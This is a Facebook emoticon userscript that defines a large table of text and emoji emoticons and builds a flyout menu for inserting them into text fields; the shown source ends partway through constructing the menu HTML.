	// ==UserScript==
// @name            All 3D Emoticons 2014 Facebook!
// @description     All about facebook 
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
// ==13470X==
// ==============
// ==Icon==
(function() {
	// Active only in main frame
	if (!document.querySelector("#pageNav")) {
		return;
	}
	//console.info("Extra Facebook Smileys");

	// = Data =======
	var emoticons = [ { // Text to picture emoticons
"chars" : " :) ",
		"class" : "emoticon_smile",
		"name" : "Smiley"
	}, {
		"chars" : " :( ",
		"class" : "emoticon_frown",
		"name" : "Frown"
	}, {
		"chars" : " :P ",
		"class" : "emoticon_tongue",
		"name" : "Tongue"
	}, {
        "chars" : " :D ",
		"class" : "emoticon_grin",
		"name" : "Grin"
	}, {
		"chars" : " :o ",
		"class" : "emoticon_gasp",
		"name" : "Gasp"
	}, {
		"chars" : " ;) ",
		"class" : "emoticon_wink",
		"name" : "Wink"
	}, {
		"chars" : " :v ",
		"class" : "emoticon_pacman",
		"name" : "Pacman"
	}, {
		"chars" : " >:( ",
		"class" : "emoticon_grumpy",
		"name" : "GruÃ±Ã³n"
	}, {
		"chars" : " :/ ",
		"class" : "emoticon_unsure",
		"name" : "Unsure"
	}, {
		"chars" : " :'( ",
		"class" : "emoticon_cry",
		"name" : "Cry"
	}, {
		"chars" : " ^_^ ",
		"class" : "emoticon_kiki",
		"name" : "Kiki"
	}, {
		"chars" : " 8) ",
		"class" : "emoticon_glasses",
		"name" : "Glasses"
	}, {
		"chars" : " B| ",
		"class" : "emoticon_sunglasses",
		"name" : "Sunglasses"
	}, {
		"chars" : " <3 ",
		"class" : "emoticon_heart",
		"name" : "Heart"
	}, {
		"chars" : " 3:) ",
		"class" : "emoticon_devil",
		"name" : "Devil"
	}, {
		"chars" : " O:) ",
		"class" : "emoticon_angel",
		"name" : "Angel"
	}, {
		"chars" : " -_- ",
		"class" : "emoticon_squint",
		"name" : "Squint"
	}, {
		"chars" : " o.O ",
		"class" : "emoticon_confused",
		"name" : "Confused"
	}, {
		"chars" : " >:o ",
		"class" : "emoticon_upset",
		"name" : "Upset"
	}, {
		"chars" : " :3 ",
		"class" : "emoticon_colonthree",
		"name" : "Colonthree"
	}, {
		"chars" : " (y) ",
		"class" : "emoticon_like",
		"name" : "Like"
	}, {
		"chars" : " :* ",
		"class" : "emoticon emoticon_kiss",
		"name" : "Kiss"
	}, {
		"chars" : " (^^^) ",
		"class" : "emoticon_shark",
		"name" : "Shark"
	}, {
		"chars" : " :|] ",
		"class" : "emoticon_robot",
		"name" : "Robot"
	}, {
		"chars" : " <(\") ",
		"class" : "emoticon_penguin",
		"name" : "PingÃ¼ino"
	}, {
		"chars" : " :poop: ",
		"class" : "emoticon_poop",
		"name" : "Poop"
        }, {
		"chars" : " :putnam: ",
		"class" : "emoticon_putnam",
		"name" : "Putman"
	}, {
		"chars" : " \ud83c\udf02 ",
		"class" : "_1az _1a- _2c0",
		"name" : "Pink Umbrella"
	}, {
		"chars" : " \ud83c\udf0a ",
		"class" : "_1az _1a- _2c1",
		"name" : "Sea Wave"
	}, {
		"chars" : " \ud83c\udf19 ",
		"class" : "_1az _1a- _2c2",
		"name" : "Crescent moon"
	}, {
		"chars" : " \ud83c\udf1f ",
		"class" : "_1az _1a- _2c3",
		"name" : "Bright Star"
	}, {
		"chars" : " \ud83c\udf31 ",
		"class" : "_1az _1a- _2c4",
		"name" : "Seedbed"
	}, {
		"chars" : " \ud83c\udf34 ",
		"class" : "_1az _1a- _2c5",
		"name" : "Single Palm Tree"
	}, {
		"chars" : " \ud83c\udf35 ",
		"class" : "_1az _1a- _2c6",
		"name" : "Cactus"
	}, {
		"chars" : " \ud83c\udf37 ",
		"class" : "_1az _1a- _2c7",
		"name" : "Tulip"
	}, {
		"chars" : " \ud83c\udf38 ",
		"class" : "_1az _1a- _2c8",
		"name" : "Cherry Blossom"
	}, {
		"chars" : " \ud83c\udf39 ",
		"class" : "_1az _1a- _2c9",
		"name" : "Rose"
	}, {
		"chars" : " \ud83c\udf3a ",
		"class" : "_1az _1a- _2ca",
		"name" : "Cayenne"
	}, {
		"chars" : " \ud83c\udf3b ",
		"class" : "_1az _1a- _2cb",
		"name" : "Sunflower"
	}, {
		"chars" : " \ud83c\udf3e ",
		"class" : "_1az _1a- _2cc",
		"name" : "Ear Of Rice"
	}, {
		"chars" : " \ud83c\udf40 ",
		"class" : "_1az _1a- _2cd",
		"name" : "Four Leaf Clover"
	}, {
		"chars" : " \ud83c\udf41 ",
		"class" : "_1az _1a- _2ce",
		"name" : "Maple Leaf"
	}, {
		"chars" : " \ud83c\udf42 ",
		"class" : "_1az _1a- _2cf",
		"name" : "Fallen Leaf"
	}, {
		"chars" : " \ud83c\udf43 ",
		"class" : "_1az _1a- _2cg",
		"name" : "Leaf Floating In The Wind"
	}, {
		"chars" : " \ud83c\udf4a ",
		"class" : "_1az _1a- _2ch",
		"name" : "Tangerine"
	}, {
		"chars" : " \ud83c\udf4e ",
		"class" : "_1az _1a- _2ci",
		"name" : "Red Apple"
	}, {
		"chars" : " \ud83c\udf53 ",
		"class" : "_1az _1a- _2cj",
		"name" : "Strawberry"
	}, {
		"chars" : " \ud83c\udf54 ",
		"class" : "_1az _1a- _2ck",
		"name" : "Burger"
	}, {
		"chars" : " \ud83c\udf78 ",
		"class" : "_1az _1a- _2cl",
		"name" : "Cocktail Glass"
	}, {
		"chars" : " \ud83c\udf7a ",
		"class" : "_1az _1a- _2cm",
		"name" : "Tankard"
	}, {
		"chars" : " \ud83c\udf81 ",
		"class" : "_1az _1a- _2cn",
		"name" : "Gift Wrapped"
	}, {
		"chars" : " \ud83c\udf83 ",
		"class" : "_1az _1a- _2co",
		"name" : "Pumpkin With Candle"
	}, {
		"chars" : " \ud83c\udf84 ",
		"class" : "_1az _1a- _2cp",
		"name" : "Christmas Tree"
	}, {
		"chars" : " \ud83c\udf85 ",
		"class" : "_1az _1a- _2cq",
		"name" : "Santa"
	}, {
		"chars" : " \ud83c\udf88 ",
		"class" : "_1az _1a- _2cr",
		"name" : "Balloon"
	}, {
		"chars" : " \ud83c\udf89 ",
		"class" : "_1az _1a- _2cs",
		"name" : "Party Popper"
	}, {
		"chars" : " \ud83c\udf8d ",
		"class" : "_1az _1a- _2ct",
		"name" : "Pine Decor"
	}, {
		"chars" : " \ud83c\udf8e ",
		"class" : "_1az _1a- _2cu",
		"name" : "Japanese Dolls"
	}, {
		"chars" : " \ud83c\udf8f ",
		"class" : "_1az _1a- _2cv",
		"name" : "Carp Streamer"
	}, {
		"chars" : " \ud83c\udf90 ",
		"class" : "_1az _1a- _2cw",
		"name" : "Wind Chime"
	}, {
		"chars" : " \ud83c\udf93 ",
		"class" : "_1az _1a- _2cx",
		"name" : "Graduation Cap"
	}, {
		"chars" : " \ud83c\udfb5 ",
		"class" : "_1az _1a- _2cy",
		"name" : "Musical Note"
	}, {
		"chars" : " \ud83c\udfb6 ",
		"class" : "_1az _1a- _2cz",
		"name" : "Multiple Musical Notes"
	}, {
		"chars" : " \ud83c\udfbc ",
		"class" : "_1az _1a- _2c-",
		"name" : "Musical Score"
	}, {
		"chars" : " \ud83d\udc0d ",
		"class" : "_1az _1a- _2c_",
		"name" : "Snake"
	}, {
		"chars" : " \ud83d\udc0e ",
		"class" : "_1az _1a- _2d0",
		"name" : "Horse"
	}, {
		"chars" : " \ud83d\udc11 ",
		"class" : "_1az _1a- _2d1",
		"name" : "Sheep"
	}, {
		"chars" : " \ud83d\udc12 ",
		"class" : "_1az _1a- _2d2",
		"name" : "Monkey"
	}, {
		"chars" : " \ud83d\udc14 ",
		"class" : "_1az _1a- _2d3",
		"name" : "Hen"
	}, {
		"chars" : " \ud83d\udc17 ",
		"class" : "_1az _1a- _2d4",
		"name" : "Wild Boar"
	}, {
		"chars" : " \ud83d\udc18 ",
		"class" : "_1az _1a- _2d5",
		"name" : "Elephant"
	}, {
		"chars" : " \ud83d\udc19 ",
		"class" : "_1az _1a- _2d6",
		"name" : "Octopus"
	}, {
		"chars" : " \ud83d\udc1a ",
		"class" : "_1az _1a- _2d7",
		"name" : "Snail Shell"
	}, {
		"chars" : " \ud83d\udc1b ",
		"class" : "_1az _1a- _2d8",
		"name" : "Insect"
	}, {
		"chars" : " \ud83d\udc1f ",
		"class" : "_1az _1a- _2d9",
		"name" : "Fish"
	}, {
		"chars" : " \ud83d\udc20 ",
		"class" : "_1az _1a- _2da",
		"name" : "Tropical Fish"
	}, {
		"chars" : " \ud83d\udc21 ",
		"class" : "_1az _1a- _2db",
		"name" : "Pufferfish"
	}, {
		"chars" : " \ud83d\udc25 ",
		"class" : "_1az _1a- _2dc",
		"name" : "Chick In Front"
	}, {
		"chars" : " \ud83d\udc26 ",
		"class" : "_1az _1a- _2dd",
		"name" : "Bird"
	}, {
		"chars" : " \ud83d\udc27 ",
		"class" : "_1az _1a- _2de",
		"name" : "Penguin"
	}, {
		"chars" : " \ud83d\udc28 ",
		"class" : "_1az _1a- _2df",
		"name" : "Koala"
	}, {
		"chars" : " \ud83d\udc29 ",
		"class" : "_1az _1a- _2dg",
		"name" : "Poodle"
	}, {
		"chars" : " \ud83d\udc2b ",
		"class" : "_1az _1a- _2dh",
		"name" : "Bactrian Camel"
	}, {
		"chars" : " \ud83d\udc2c ",
		"class" : "_1az _1a- _2di",
		"name" : "Dolphin"
	}, {
		"chars" : " \ud83d\udc2d ",
		"class" : "_1az _1a- _2dj",
		"name" : "Mouse Face"
	}, {
		"chars" : " \ud83d\udc2e ",
		"class" : "_1az _1a- _2dk",
		"name" : "Cow Face"
	}, {
		"chars" : " \ud83d\udc2f ",
		"class" : "_1az _1a- _2dl",
		"name" : "Cara de tigre"
	}, {
		"chars" : " \ud83d\udc30 ",
		"class" : "_1az _1a- _2dm",
		"name" : "Rabbit Face"
	}, {
		"chars" : " \ud83d\udc31 ",
		"class" : "_1az _1a- _2dn",
		"name" : "Cat Face"
	}, {
		"chars" : " \ud83d\udc33 ",
		"class" : "_1az _1a- _2do",
		"name" : "Whale Sputtering"
	}, {
		"chars" : " \ud83d\udc34 ",
		"class" : "_1az _1a- _2dp",
		"name" : "Horse Face"
	}, {
		"chars" : " \ud83d\udc35 ",
		"class" : "_1az _1a- _2dq",
		"name" : "Monkey Face"
	}, {
		"chars" : " \ud83d\udc37 ",
		"class" : "_1az _1a- _2dr",
		"name" : "Pig face"
	}, {
		"chars" : " \ud83d\udc38 ",
		"class" : "_1az _1a- _2ds",
		"name" : "Frog Face"
	}, {
		"chars" : " \ud83d\udc39 ",
		"class" : "_1az _1a- _2dt",
		"name" : "Hamster Face"
	}, {
		"chars" : " \ud83d\udc3a ",
		"class" : "_1az _1a- _2du",
		"name" : "Wolf Face"
	}, {
		"chars" : " \ud83d\udc3b ",
		"class" : "_1az _1a- _2dv",
		"name" : "Bear Face"
	}, {
		"chars" : " \ud83d\udc3e ",
		"class" : "_1az _1a- _2dw",
		"name" : "Footprints"
	}, {
		"chars" : " \ud83d\udc40 ",
		"class" : "_1az _1a- _2dx",
		"name" : "Eyes"
	}, {
		"chars" : " \ud83d\udc42 ",
		"class" : "_1az _1a- _2dy",
		"name" : "Ear"
	}, {
		"chars" : " \ud83d\udc43 ",
		"class" : "_1az _1a- _2dz",
		"name" : "Nose"
	}, {
		"chars" : " \ud83d\udc44 ",
		"class" : "_1az _1a- _2d-",
		"name" : "Mouth"
	}, {
		"chars" : " \ud83d\udc45 ",
		"class" : "_1az _1a- _2d_",
		"name" : "Sour Face"
	}, {
		"chars" : " \ud83d\udc46 ",
		"class" : "_1az _1a- _2e0",
		"name" : "White hand pointing up"
	}, {
		"chars" : " \ud83d\udc47 ",
		"class" : "_1az _1a- _2e1",
		"name" : "White hand faces downward"
	}, {
		"chars" : " \ud83d\udc48 ",
		"class" : "_1az _1a- _2e2",
		"name" : "White hand indicating left"
	}, {
		"chars" : " \ud83d\udc49 ",
		"class" : "_1az _1a- _2e3",
		"name" : "White hand indicating right"
	}, {
		"chars" : " \ud83d\udc4a ",
		"class" : "_1az _1a- _2e4",
		"name" : "Fist"
	}, {
		"chars" : " \ud83d\udc4b ",
		"class" : "_1az _1a- _2e5",
		"name" : "Hand in motion"
	}, {
		"chars" : " \ud83d\udc4c ",
		"class" : "_1az _1a- _2e6",
		"name" : "Hand showing all good"
	}, {
		"chars" : " \ud83d\udc4d ",
		"class" : "_1az _1a- _2e7",
		"name" : "Hand with thumb up"
	}, {
		"chars" : " \ud83d\udc4e ",
		"class" : "_1az _1a- _2e8",
		"name" : "Hand with thumb down"
	}, {
		"chars" : " \ud83d\udc4f ",
		"class" : "_1az _1a- _2e9",
		"name" : "Hands clapping"
	}, {
		"chars" : " \ud83d\udc50 ",
		"class" : "_1az _1a- _2ea",
		"name" : "Open Hands"
	}, {
		"chars" : " \ud83d\udc66 ",
		"class" : "_1az _1a- _2eb",
		"name" : "Boy"
	}, {
		"chars" : " \ud83d\udc67 ",
		"class" : "_1az _1a- _2ec",
		"name" : "Girl"
	}, {
		"chars" : " \ud83d\udc68 ",
		"class" : "_1az _1a- _2ed",
		"name" : "Man"
	}, {
		"chars" : " \ud83d\udc69 ",
		"class" : "_1az _1a- _2ee",
		"name" : "Woman"
	}, {
		"chars" : " \ud83d\udc6b ",
		"class" : "_1az _1a- _2ef",
		"name" : "Man and woman holding hands"
	}, {
		"chars" : " \ud83d\udc6e ",
		"class" : "_1az _1a- _2eg",
		"name" : "Police Officer"
	}, {
		"chars" : " \ud83d\udc6f ",
		"class" : "_1az _1a- _2eh",
		"name" : "Woman with bunny ears"
	}, {
		"chars" : " \ud83d\udc71 ",
		"class" : "_1az _1a- _2ei",
		"name" : "Person with hair rubio"
	}, {
		"chars" : " \ud83d\udc72 ",
		"class" : "_1az _1a- _2ej",
		"name" : "Man with pi mao gua"
	}, {
		"chars" : " \ud83d\udc73 ",
		"class" : "_1az _1a- _2ek",
		"name" : "Man with turban"
	}, {
		"chars" : " \ud83d\udc74 ",
		"class" : "_1az _1a- _2el",
		"name" : "Old Man"
	}, {
		"chars" : " \ud83d\udc75 ",
		"class" : "_1az _1a- _2em",
		"name" : "Old Woman"
	}, {
		"chars" : " \ud83d\udc76 ",
		"class" : "_1az _1a- _2en",
		"name" : "Baby"
	}, {
		"chars" : " \ud83d\udc77 ",
		"class" : "_1az _1a- _2eo",
		"name" : "Construction Worker"
	}, {
		"chars" : " \ud83d\udc78 ",
		"class" : "_1az _1a- _2ep",
		"name" : "Princess"
	}, {
		"chars" : " \ud83d\udc7b ",
		"class" : "_1az _1a- _2eq",
		"name" : "Ghost"
	}, {
		"chars" : " \ud83d\udc7c ",
		"class" : "_1az _1a- _2er",
		"name" : "Angel baby"
	}, {
		"chars" : " \ud83d\udc7d ",
		"class" : "_1az _1a- _2es",
		"name" : "Alien"
	}, {
		"chars" : " \ud83d\udc7e ",
		"class" : "_1az _1a- _2et",
		"name" : "Alien Monster"
	}, {
		"chars" : " \ud83d\udc7f ",
		"class" : "_1az _1a- _2eu",
		"name" : "Imp"
	}, {
		"chars" : " \ud83d\udc80 ",
		"class" : "_1az _1a- _2ev",
		"name" : "Skull"
	}, {
		"chars" : " \ud83d\udc82 ",
		"class" : "_1az _1a- _2ew",
		"name" : "Guard"
	}, {
		"chars" : " \ud83d\udc83 ",
		"class" : "_1az _1a- _2ex",
		"name" : "Ballerina"
	}, {
		"chars" : " \ud83d\udc85 ",
		"class" : "_1az _1a- _2ey",
		"name" : "Nail Polish"
	}, {
		"chars" : " \ud83d\udc8b ",
		"class" : "_1az _1a- _2ez",
		"name" : "Brand of kiss"
	}, {
		"chars" : " \ud83d\udc8f ",
		"class" : "_1az _1a- _2e-",
		"name" : "Kissing couple"
	}, {
		"chars" : " \ud83d\udc90 ",
		"class" : "_1az _1a- _2e_",
		"name" : "Bunch of flowers"
	}, {
		"chars" : " \ud83d\udc91 ",
		"class" : "_1az _1a- _2f0",
		"name" : "Couple with heart"
	}, {
		"chars" : " \ud83d\udc93 ",
		"class" : "_1az _1a- _2f1",
		"name" : "Heart beating"
	}, {
		"chars" : " \ud83d\udc94 ",
		"class" : "_1az _1a- _2f2",
		"name" : "Broken Heart"
	}, {
		"chars" : " \ud83d\udc96 ",
		"class" : "_1az _1a- _2f3",
		"name" : "Bright Heart"
	}, {
		"chars" : " \ud83d\udc97 ",
		"class" : "_1az _1a- _2f4",
		"name" : "Heart growing"
	}, {
		"chars" : " \ud83d\udc98 ",
		"class" : "_1az _1a- _2f5",
		"name" : "Heart with arrow"
	}, {
		"chars" : " \ud83d\udc99 ",
		"class" : "_1az _1a- _2f6",
		"name" : "Blue Heart"
	}, {
		"chars" : " \ud83d\udc9a ",
		"class" : "_1az _1a- _2f7",
		"name" : "Green Heart"
	}, {
		"chars" : " \ud83d\udc9b ",
		"class" : "_1az _1a- _2f8",
		"name" : "Yellow Heart"
	}, {
		"chars" : " \ud83d\udc9c ",
		"class" : "_1az _1a- _2f9",
		"name" : "Purple Heart"
	}, {
		"chars" : " \ud83d\udc9d ",
		"class" : "_1az _1a- _2fa",
		"name" : "Heart with ribbon"
	}, {
		"chars" : " \ud83d\udca2 ",
		"class" : "_1az _1a- _2fb",
		"name" : "Symbol of anger"
	}, {
		"chars" : " \ud83d\udca4 ",
		"class" : "_1az _1a- _2fc",
		"name" : "Sleeping"
	}, {
		"chars" : " \ud83d\udca6 ",
		"class" : "_1az _1a- _2fd",
		"name" : "Sweat Symbol"
	}, {
		"chars" : " \ud83d\udca8 ",
		"class" : "_1az _1a- _2fe",
		"name" : "Quick Start Symbol"
	}, {
		"chars" : " \ud83d\udca9 ",
		"class" : "_1az _1a- _2ff",
		"name" : "Pile of Caca"
	}, {
		"chars" : " \ud83d\udcaa ",
		"class" : "_1az _1a- _2fg",
		"name" : "Flexed bicep"
	}, {
		"chars" : " \ud83d\udcbb ",
		"class" : "_1az _1a- _2fh",
		"name" : "Personal Computer"
	}, {
		"chars" : " \ud83d\udcbd ",
		"class" : "_1az _1a- _2fi",
		"name" : "Mini Disco"
	}, {
		"chars" : " \ud83d\udcbe ",
		"class" : "_1az _1a- _2fj",
		"name" : "Floppy disk"
	}, {
		"chars" : " \ud83d\udcbf ",
		"class" : "_1az _1a- _2fk",
		"name" : "Optical Disc"
	}, {
		"chars" : " \ud83d\udcc0 ",
		"class" : "_1az _1a- _2fl",
		"name" : "DVD"
	}, {
		"chars" : " \ud83d\udcde ",
		"class" : "_1az _1a- _2fm",
		"name" : "Telephone receiver"
	}, {
		"chars" : " \ud83d\udce0 ",
		"class" : "_1az _1a- _2fn",
		"name" : "Fax"
	}, {
		"chars" : " \ud83d\udcf1 ",
		"class" : "_1az _1a- _2fo",
		"name" : "Mobile Phone"
	}, {
		"chars" : " \ud83d\udcf2 ",
		"class" : "_1az _1a- _2fp",
		"name" : "Mobile phone with arrow from left to right"
	}, {
		"chars" : " \ud83d\udcfa ",
		"class" : "_1az _1a- _2fq",
		"name" : "Television"
	}, {
		"chars" : " \ud83d\udd14 ",
		"class" : "_1az _1a- _2fr",
		"name" : "Bell"
	}, {
		"chars" : " \ud83d\ude01 ",
		"class" : "_1az _1a- _2fs",
		"name" : "Face to face with smiling eyes"
	}, {
		"chars" : " \ud83d\ude02 ",
		"class" : "_1az _1a- _2ft",
		"name" : "Face with tears of joy"
	}, {
		"chars" : " \ud83d\ude03 ",
		"class" : "_1az _1a- _2fu",
		"name" : "Smiley face with open mouth"
	}, {
		"chars" : " \ud83d\ude04 ",
		"class" : "_1az _1a- _2fv",
		"name" : "Face and eyes smiling with mouth open"
	}, {
		"chars" : " \ud83d\ude06 ",
		"class" : "_1az _1a- _2fw",
		"name" : "Smiley face with mouth open and eyes closed"
	}, {
		"chars" : " \ud83d\ude09 ",
		"class" : "_1az _1a- _2fx",
		"name" : "Face winking eye"
	}, {
		"chars" : " \ud83d\ude0b ",
		"class" : "_1az _1a- _2fy",
		"name" : "Guy savoring delicious food"
	}, {
		"chars" : " \ud83d\ude0c ",
		"class" : "_1az _1a- _2fz",
		"name" : "Relief face"
	}, {
		"chars" : " \ud83d\ude0d ",
		"class" : "_1az _1a- _2f-",
		"name" : "Smiley face with heart shaped eyes"
	}, {
		"chars" : " \ud83d\ude0f ",
		"class" : "_1az _1a- _2f_",
		"name" : "Smirk face"
	}, {
		"chars" : " \ud83d\ude12 ",
		"class" : "_1az _1a- _2g0",
		"name" : "Face of boredom"
	}, {
		"chars" : " \ud83d\ude13 ",
		"class" : "_1az _1a- _2g1",
		"name" : "Face with cold sweat"
	}, {
		"chars" : " \ud83d\ude14 ",
		"class" : "_1az _1a- _2g2",
		"name" : "Pensive face"
	}, {
		"chars" : " \ud83d\ude16 ",
		"class" : "_1az _1a- _2g3",
		"name" : "Confused face"
	}, {
		"chars" : " \ud83d\ude18 ",
		"class" : "_1az _1a- _2g4",
		"name" : "Throwing kiss Face"
	}, {
		"chars" : " \ud83d\ude1a ",
		"class" : "_1az _1a- _2g5",
		"name" : "Kissing face with eyes closed"
	}, {
		"chars" : " \ud83d\ude1c ",
		"class" : "_1az _1a- _2g6",
		"name" : "Face with tongue out and winking"
	}, {
		"chars" : " \ud83d\ude1d ",
		"class" : "_1az _1a- _2g7",
		"name" : "Face with tongue hanging out and eyes closed"
	}, {
		"chars" : " \ud83d\ude1e ",
		"class" : "_1az _1a- _2g8",
		"name" : "Face discouraged"
	}, {
		"chars" : " \ud83d\ude20 ",
		"class" : "_1az _1a- _2g9",
		"name" : "Face of anger"
	}, {
		"chars" : " \ud83d\ude21 ",
		"class" : "_1az _1a- _2ga",
		"name" : "Very angry face"
	}, {
		"chars" : " \ud83d\ude22 ",
		"class" : "_1az _1a- _2gb",
		"name" : "Crying Face"
	}, {
		"chars" : " \ud83d\ude23 ",
		"class" : "_1az _1a- _2gc",
		"name" : "Face of perseverance"
	}, {
		"chars" : " \ud83d\ude24 ",
		"class" : "_1az _1a- _2gd",
		"name" : "Face of triumph"
	}, {
		"chars" : " \ud83d\ude25 ",
		"class" : "_1az _1a- _2ge",
		"name" : "Face discouraged but relieved"
	}, {
		"chars" : " \ud83d\ude28 ",
		"class" : "_1az _1a- _2gf",
		"name" : "Scary face"
	}, {
		"chars" : " \ud83d\ude29 ",
		"class" : "_1az _1a- _2gg",
		"name" : "Fatigued face"
	}, {
		"chars" : " \ud83d\ude2a ",
		"class" : "_1az _1a- _2gh",
		"name" : "Sleeping face"
	}, {
		"chars" : " \ud83d\ude2b ",
		"class" : "_1az _1a- _2gi",
		"name" : "Tired face"
	}, {
		"chars" : " \ud83d\ude2d ",
		"class" : "_1az _1a- _2gj",
		"name" : "Face screaming"
	}, {
		"chars" : " \ud83d\ude30 ",
		"class" : "_1az _1a- _2gk",
		"name" : "Face with mouth open and cold sweat"
	}, {
		"chars" : " \ud83d\ude31 ",
		"class" : "_1az _1a- _2gl",
		"name" : "Terrified face of fear"
	}, {
		"chars" : " \ud83d\ude32 ",
		"class" : "_1az _1a- _2gm",
		"name" : "Very surprised face"
	}, {
		"chars" : " \ud83d\ude33 ",
		"class" : "_1az _1a- _2gn",
		"name" : "Face flushed"
	}, {
		"chars" : " \ud83d\ude35 ",
		"class" : "_1az _1a- _2go",
		"name" : "Face dizzy"
	}, {
		"chars" : " \ud83d\ude37 ",
		"class" : "_1az _1a- _2gp",
		"name" : "Face with medical mask"
	}, {
		"chars" : " \ud83d\ude38 ",
		"class" : "_1az _1a- _2gq",
		"name" : "Grinning Cat face and eyes closed"
	}, {
		"chars" : " \ud83d\ude39 ",
		"class" : "_1az _1a- _2gr",
		"name" : "Cat face with tears of laughter"
	}, {
		"chars" : " \ud83d\ude3a ",
		"class" : "_1az _1a- _2gs",
		"name" : "Smiling cat face with open mouth"
	}, {
		"chars" : " \ud83d\ude3b ",
		"class" : "_1az _1a- _2gt",
		"name" : "Smiling cat face with hearts in her eyes"
	}, {
		"chars" : " \ud83d\ude3c ",
		"class" : "_1az _1a- _2gu",
		"name" : "Face of cat smile twisted"
	}, {
		"chars" : " \ud83d\ude3d ",
		"class" : "_1az _1a- _2gv",
		"name" : "Cat face kissing with eyes closed"
	}, {
		"chars" : " \ud83d\ude3f ",
		"class" : "_1az _1a- _2gw",
		"name" : "Cat face crying"
	}, {
		"chars" : " \ud83d\ude40 ",
		"class" : "_1az _1a- _2gx",
		"name" : "Cat face scared terrified"
	}, {
		"chars" : " \ud83d\ude4b ",
		"class" : "_1az _1a- _2gy",
		"name" : "Happy person raising a hand"
	}, {
		"chars" : " \ud83d\ude4c ",
		"class" : "_1az _1a- _2gz",
		"name" : "Person holding up both hands in celebration"
	}, {
		"chars" : " \ud83d\ude4d ",
		"class" : "_1az _1a- _2g-",
		"name" : "Person frowning"
	}, {
		"chars" : " \ud83d\ude4f ",
		"class" : "_1az _1a- _2g_",
		"name" : "Person in prayer"
	}, {
		"chars" : " \u261d ",
		"class" : "_1az _1a- _2h0",
		"name" : "Index finger pointing up"
	}, {
		"chars" : " \u263a ",
		"class" : "_1az _1a- _2h1",
		"name" : "White face smiling"
	}, {
		"chars" : " \u26a1 ",
		"class" : "_1az _1a- _2h2",
		"name" : "High voltage symbol"
	}, {
		"chars" : " \u26c4 ",
		"class" : "_1az _1a- _2h3",
		"name" : "Snowless snowman"
	}, {
		"chars" : " \u270a ",
		"class" : "_1az _1a- _2h4",
		"name" : "Fist up"
	}, {
		"chars" : " \u270b ",
		"class" : "_1az _1a- _2h5",
		"name" : "Hand pointing up"
	}, {
		"chars" : " \u270c ",
		"class" : "_1az _1a- _2h6",
		"name" : "Winning Hand"
	}, {
		"chars" : " \u2600 ",
		"class" : "_1az _1a- _2h7",
		"name" : "Sun With Rays"
	}, {
		"chars" : " \u2601 ",
		"class" : "_1az _1a- _2h8",
		"name" : "Cloud"
	}, {
		"chars" : " \u2614 ",
		"class" : "_1az _1a- _2h9",
		"name" : "Umbrella With Rain Drops"
	}, {
		"chars" : " \u2615 ",
		"class" : "_1az _1a- _2ha",
		"name" : "Hot Drink"
	}, {
		"chars" : " \u2728 ",
		"class" : "_1az _1a- _2hb",
		"name" : "Brightness"
	}, {
		"chars" : " \u2764 ",
		"class" : "_1az _1a- _2hc",
		"name" : "Heavy Black Heart"
	} ];

	// = Variables =======
	var lastActiveElement = document.activeElement;

	// = Functions =======
	function createElement(html) {
		var outerHTML = document.createElement("div");
		outerHTML.innerHTML = html;
		return outerHTML.firstChild;
	}

	function htmlSpecialChars(string) {
		var div = document.createElement("div");
		var text = document.createTextNode(string);
		div.appendChild(text);
		return div.innerHTML;
	}

	function isInstanceOfTextInput(element) {
		return (element instanceof HTMLInputElement && element.type == "text")
				|| element instanceof HTMLTextAreaElement;
	}

	function isFlyoutOpen(flyout) {
		return flyout.className == "openToggler";
	}

	function openFlyout(flyout, open) {
		if (open === undefined) {
			open = !isFlyoutOpen(flyout); // Toggle
		}

		if (open) {
			flyout.className = "openToggler";
		} else {
			flyout.removeAttribute("class");
		}
	}

	function createTab(titleContainer, bodyContainer) {
		var html;
		// Tab; default = inactive
	    html = '<li class="jewelFlyout fbJewelFlyout uiToggleFlyout">';
		html += '<div class="jewelFlyout">';
		html += '</div>';
		html += '</li>';
		var title = createElement(html);
		titleContainer.appendChild(title);

		// Manual input
		html = '<div style="display: none;">';
		html += '</div>';
		var body = createElement(html);
		bodyContainer.appendChild(body);

		// Change tab listener
		(function(body) {
			title.addEventListener("click", function() {
				// Change tab
				var titles = this.parentNode.childNodes; // tab.tabContainer.childNodes
				for ( var t = 0; t < titles.length; t++) {
					if (titles[t] === this) { // Active
						
					} else { // Inactive
						titles[t].style.background = "";
						titles[t].firstChild.style.color = "";
					}
				}

				// Change body
				var bodies = body.parentNode.childNodes; // body.bodyContainer.childNodes
				for ( var b = 0; b < bodies.length; b++) {
					if (bodies[b] === body) { // Show
						body.style.display = "";
					} else { // Hide
						bodies[b].style.display = "none";
					}
				}
			});
		})(body);

		return {
			"title" : title.firstChild,
			"body" : body
		};
	}

	function createTabListBody(emoticons, filter) {
		var html;

		html = '<div style="max-height: 200px; padding-right: 15px; overflow-x: hidden; line-height: 1em;">';
		html += '<div style="padding: 10px; width: 200px; font-size: 15px;">';
		html += '</div>';
		html += '</div>';
		var body = createElement(html).firstChild;
		for ( var e = 0; e < emoticons.length; e++) {
			var emoticon = emoticons[e];
			if (!filter(emoticon)) {
				continue;
			}

			// Icons
			html = '<span class="panelCell" style="display: inline-block; vertical-align: middle; padding: 2px;">';
			html += '<a';
			html += ' class="emoticon'
					+ (emoticon.class !== undefined ? ' ' + emoticon.class : '')
					+ '"';
			html += ' style="text-decoration: inherit; color: inherit;'
					+ (emoticon.class !== undefined ? ' color: transparent;'
							: ' width: auto;') + '"';
			html += (emoticon.name !== undefined ? ' title="' + emoticon.name
					+ '"' : '');
			html += '>';
			html += htmlSpecialChars(emoticon.chars);
			html += '</a>';
			html += '</span>';
			var cell = createElement(html);
			body.appendChild(cell);

			// Select emoticon listener
			var emoticonA = cell.firstChild;
			(function(emoticon) {
				emoticonA.addEventListener("click", function() {
					if (isInstanceOfTextInput(lastActiveElement)) {
						lastActiveElement.focus();

						var chars = emoticon.chars;
						var value = lastActiveElement.value;
						var start = lastActiveElement.selectionStart;
						var end = lastActiveElement.selectionEnd;
						lastActiveElement.value = value.substring(0, start)
								+ chars + value.substring(end);
						lastActiveElement.setSelectionRange(start + chars.length, start + chars.length);
					}

					openFlyoutCommand = false; // Close flyout
				});
			})(emoticon);
		}

		return body.parentNode;
	}

	// = Construct UI =======
	var html;

	// Menu item
	// var navItem
	html = '<li class="navItem middleItem notifNegativeBase">';
	html += '<div class="fbJewel">';
	// {

	// Toggler
	html += '<a class="navLink" title="1 Thông Báo M?i">'; // var navLink
